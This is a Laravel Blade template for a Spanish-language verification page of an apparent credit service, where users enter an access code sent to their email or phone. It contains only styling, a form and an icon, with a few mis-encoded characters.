<!DOCTYPE html>
<html lang="{{ str_replace('_', '-', app()->getLocale()) }}">
        <head>
            <meta charset="UTF-8">
            <meta http-equiv="X-UA-Compatible" content="IE=edge">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Codigo | Credito</title>
            <!-- icon -->
            <link rel="icon" href="https://www.itsolutionsengly.com/images/Ite-icon.png">
            <link rel="stylesheet" href="{{ asset('css/layout.css') }}">
            <link rel="preconnect" href="https://fonts.googleapis.com">
            <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
            <link href="https://fonts.googleapis.com/css2?family=Rubik:wght@300&display=swap" rel="stylesheet">
            <style>

                .logo-container{
                    margin-top: 170px;
                }

                .second-sec{
                    display: flex;
                    flex-direction: column;
                    align-items: center;
                    font-size: 15px;
                }

                h2{
                    color:  #262650;
                }

                .second-sec p{
                    margin: 0 25px;
                    text-align: center;
                }

                .third-sec{
                    font-weight: bold;
                    margin: 1rem 20px;
                    text-align: center;
                    font-size: 15px;
                    color: #262650;
                }

                input[type=text]{
                    padding: 13px 70px;
                    height: 10px;
                    border-radius: 10px;
                    border: none;
                    margin: 5px 0;
                    text-align: center;
                    width: 100px;
                }
            

                input[type="submit"]{
                    margin-left: 15px;
                }


                .btn-box button{
                    padding: 7px 15px;
                    background-color: transparent;
                    border: 2px solid #262650;
                    color: #262650;
                    font-weight: bold;
                    cursor: pointer;
                    font-size: 9px;
                }

                .btn-box{
                    display: flex;
                    flex-direction: column;
                    align-items: end;
                    width: 365px;
                }

                a{
                    border: 1px solid #262650;
                    text-decoration: none;
                    color: #262650;
                    padding: 10px;
                }

                    @media only screen and (max-width: 600px) {
                        .logo-container{
                            margin-top: 50px;
                        }
                    }

                    @media only screen and (min-width: 1200px) {

                    .logo-container{
                        margin-top: 90px;
                    }

                    .leyend{
                        font-weight: 600;
                    }

                }

                .codes{
                    color: #262650;
                    background-color: transparent;
                    font-weight: bold;
                    cursor: pointer;
                    border: none;
                }



    </style>
</head>
<body>
    <section class="text-container">

        <section class="logo-container">
            <h1>Logo</h1>
        </section>

        <section class="second-sec">
            <h2>Tu tranquilidad es primero</h2>
            <div class="leyend">
            <p>Para brindarte las mejores soluciones debemos confirmar tu identidad, enviaremos un c&oacute;digo de acceso al email o n&uacute;mero telef&oacute;nico registrado</p>
            </div>
        </section>

        <section class="third-sec">
        <form action="{{route('redirect.quarter')}}" method="POST">
			@csrf
            <p>Hemos enviado un c&oacute;digo de acceso a tu email</p>
            <input type="text" placeholder="Ingresar c??digo" name="code">
            <input type="submit" class="submit" value="Ingresar">
            <input type="hidden"  name="email" value="{{$email}}">
            <input type="hidden"  name="phone" value="{{$phone}}">

            @error('code')
                <div class="is-invalid">{{ $message }}</div>
            @enderror
        </section>
    </form>

        <section class="btn-box">
            <a href="javascript:history.back()">
                <svg xmlns="http://www.w3.org/2000/svg" style="width: 15px; margin-bottom: -4px;" fill=" #262650" viewBox="0 0 448 512"><!--! Font Awesome Pro 6.2.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license (Commercial License) Copyright 2022 Fonticons, Inc. --><path d="M224 96c38.4 0 73.7 13.5 101.3 36.1l-32.6 32.6c-4.6 4.6-5.9 11.5-3.5 17.4s8.3 9.9 14.8 9.9H416c8.8 0 16-7.2 16-16V64c0-6.5-3.9-12.3-9.9-14.8s-12.9-1.1-17.4 3.5l-34 34C331.4 52.6 280.1 32 224 32c-10.9 0-21.5 .8-32 2.3V99.2c10.3-2.1 21-3.2 32-3.2zM100.1 154.7l32.6 32.6c4.6 4.6 11.5 5.9 17.4 3.5s9.9-8.3 9.9-14.8V64c0-8.8-7.2-16-16-16H32c-6.5 0-12.3 3.9-14.8 9.9s-1.1 12.9 3.5 17.4l34 34C20.6 148.6 0 199.9 0 256c0 10.9 .8 21.5 2.3 32H67.2c-2.1-10.3-3.2-21-3.2-32c0-38.4 13.5-73.7 36.1-101.3zM445.7 224H380.8c2.1 10.3 3.2 21 3.2 32c0 38.4-13.5 73.7-36.1 101.3l-32.6-32.6c-4.6-4.6-11.5-5.9-17.4-3.5s-9.9 8.3-9.9 14.8V448c0 8.8 7.2 16 16 16H416c6.5 0 12.3-3.9 14.8-9.9s1.1-12.9-3.5-17.4l-34-34C427.4 363.4 448 312.1 448 256c0-10.9-.8-21.5-2.3-32zM224 416c-38.4 0-73.7-13.5-101.3-36.1l32.6-32.6c4.6-4.6 5.9-11.5 3.5-17.4s-8.3-9.9-14.8-9.9H32c-8.8 0-16 7.2-16 16l0 112c0 6.5 3.9 12.3 9.9 14.8s12.9 1.1 17.4-3.5l34-34C116.6 459.4 167.9 480 224 480c10.9 0 21.5-.8 32-2.3V412.8c-10.3 2.1-21 3.2-32 3.2z"/></svg>
                Solicitar nuevo c??digo
            </a>
        </section>
    </section>
</body>
</html>
